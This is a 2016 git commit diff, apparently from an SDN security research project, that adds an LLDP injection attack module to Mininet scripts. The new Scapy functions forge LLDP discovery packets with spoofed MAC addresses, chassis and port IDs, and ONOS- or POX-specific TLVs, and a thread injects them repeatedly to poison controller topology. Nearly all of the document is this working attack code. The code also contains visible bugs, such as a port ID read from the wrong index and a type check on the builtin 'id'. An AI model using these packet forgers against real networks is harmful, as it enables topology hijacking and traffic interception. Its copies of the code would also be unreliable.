790c3041e92ffd13df868a070ce4c21178cf41a0
Samuel Jero <sjero@purdue.edu>
2016-03-04 15:40:17 -0500

    Work on LLDP injection support

--- mininet_scripts/lldp.py
+++ mininet_scripts/lldp.py
@@ -2,6 +2,7 @@
 #Host ARP manipulation Module
 import threading
 import time
+from lldp_layer import *
 from scapy.layers.l2 import Ether
 from scapy.sendrecv import sendp
 from module import Module
@@ -38,7 +39,7 @@ class LLDPInjectThread(threading.Thread):
         self.running = False
             
 
-class LLDP(Module):
+class LLDPAttack(Module):
     def __init__(self,myeth,myip,myif):
         self.name = "LLDP"
         self.ip = myip
@@ -71,7 +72,7 @@ class LLDP(Module):
         freq = 0
         num = -1
         ids = []
-        ptype = None
+        ptype = ""
 
         if 'freq' in cmd:
             freq = cmd['freq']
@@ -93,9 +94,17 @@ class LLDP(Module):
             ptype = cmd['type']
 
         try:
-            pkt = Ether()
+            if ptype == "onos":
+                pkt = self._build_pkt_onos(ids)
+            elif ptype == "pox":
+                pkt = self._build_pkt_pox(ids)
+            else:
+                pkt = self._build_pkt_gen(ids)
         except Exception as e:
             return False, str(e)
+
+        if pkt == None:
+            return False, "Bad ID"
 
         th = LLDPInjectThread(pkt,start,freq,num,self.iface)
         th.daemon = True
@@ -103,6 +112,136 @@ class LLDP(Module):
         th.start()
         return True,"Injection Sucess"
 
+    def _build_pkt_gen(self, ids):
+        pkt = Ether()/LLDP()
+        if ids[0] is not None:
+            pkt[Ether].dst = ids[0]
+        else:
+            pkt[Ether].dst = "01:23:20:00:00:01" #Nicira Discovery Multicast
+        if ids[1] is not None:
+            pkt[Ether].src = ids[1]
+        else:
+            pkt[Ether].src = "DE:AD:BE:EF:BA:11"
+        chassisid = LLDPChassisId()
+        if ids[2] is not None:
+            chassisid.macaddr = ids[2]
+        else:
+            chassisid.macaddr = self.eth
+        pkt[LLDP].tlvlist.append(chassisid)
+        portid = LLDPPortID()
+        portid.subtype = 2
+        if ids[3] is not None:
+            portid.value = ids[2]
+        else:
+            portid.value = "\0"
+        pkt[LLDP].tlvlist.append(portid)
+        ttl = LLDPTTL()
+        pkt[LLDP].tlvlist.append(ttl)
+        for i in range(4,len(ids)):
+            val = ids[i]
+            if not isinstance(id,(list,tuple)) or len(val) < 2:
+                return None
+            if val[0] != 127:
+                #Normal TLV
+                tlv = LLDPGeneric()
+                tlv.type = val[0]
+                tlv.value = val[1]
+            else:
+                #OrgSpecific TLV
+                if len(val) < 4:
+                    return None
+                tlv = LLDPOrgSpecGeneric()
+                tlv.type = val[0]
+                tlv.oui = val[1]
+                tlv.subtype = val[2]
+                tlv.value = val[3]
+            pkt[LLDP].tlvlist.append(tlv)
+        end = LLDPDUEnd()
+        pkt[LLDP].tlvlist.append(end)
+        return pkt
+    
+    def _build_pkt_onos(self, ids):
+        pkt = Ether()/LLDP()
+        if ids[0] is not None:
+            pkt[Ether].dst = ids[0]
+        else:
+            pkt[Ether].dst = "01:23:20:00:00:01" #Nicira Discovery Multicast
+        if ids[1] is not None:
+            pkt[Ether].src = ids[1]
+        else:
+            pkt[Ether].src = "DE:AD:BE:EF:BA:11"
+        chassisid = LLDPChassisId()
+        if ids[2] is not None:
+            chassisid.macaddr = ids[2]
+        else:
+            chassisid.macaddr = self.eth
+        pkt[LLDP].tlvlist.append(chassisid)
+        portid = LLDPPortID()
+        portid.subtype = 2
+        if ids[3] is not None:
+            portid.value = ids[2]
+        else:
+            portid.value = "\0"
+        pkt[LLDP].tlvlist.append(portid)
+        ttl = LLDPTTL()
+        pkt[LLDP].tlvlist.append(ttl)
+        #ONOS Name TLV
+        tlv = LLDPOrgSpecGeneric()
+        tlv.type = 127
+        tlv.oui = 0xA42305
+        tlv.subtype = 1
+        tlv.value = "ONOS Discovery"
+        pkt[LLDP].tlvlist.append(tlv)
+        #ONOS Device TLV
+        tlv = LLDPOrgSpecGeneric()
+        tlv.type = 127
+        tlv.oui = 0xA42305
+        tlv.subtype = 2
+        if ids[4] is not None:
+            tlv.value = ids[4]
+        else:
+            tlv.value = "dpid:" + self.eth
+        pkt[LLDP].tlvlist.append(tlv)
+        end = LLDPDUEnd()
+        pkt[LLDP].tlvlist.append(end)
+        return pkt
+
+    def _build_pkt_pox(self, ids):
+        pkt = Ether()/LLDP()
+        if ids[0] is not None:
+            pkt[Ether].dst = ids[0]
+        else:
+            pkt[Ether].dst = "01:23:20:00:00:01" #Nicira Discovery Multicast
+        if ids[1] is not None:
+            pkt[Ether].src = ids[1]
+        else:
+            pkt[Ether].src = "DE:AD:BE:EF:BA:11"
+        chassisid = LLDPChassisId()
+        chassisid.subtype = "Locally assigned"
+        if ids[2] is not None:
+            chassisid.value = ids[2]
+        else:
+            chassisid.value = "dpid:" + self.eth
+        pkt[LLDP].tlvlist.append(chassisid)
+        portid = LLDPPortID()
+        portid.subtype = 2
+        if ids[3] is not None:
+            portid.value = str(ids[2])
+        else:
+            portid.value = "0"
+        pkt[LLDP].tlvlist.append(portid)
+        ttl = LLDPTTL()
+        pkt[LLDP].tlvlist.append(ttl)
+        #POX System Description
+        tlv = LLDPSystemDescription()
+        if ids[4] is not None:
+            tlv.value = "dpid:" + ids[4]
+        else:
+            tlv.value = "dpid:" + self.eth
+        pkt[LLDP].tlvlist.append(tlv)
+        end = LLDPDUEnd()
+        pkt[LLDP].tlvlist.append(end)
+        return pkt
 
     def start(self):
         return
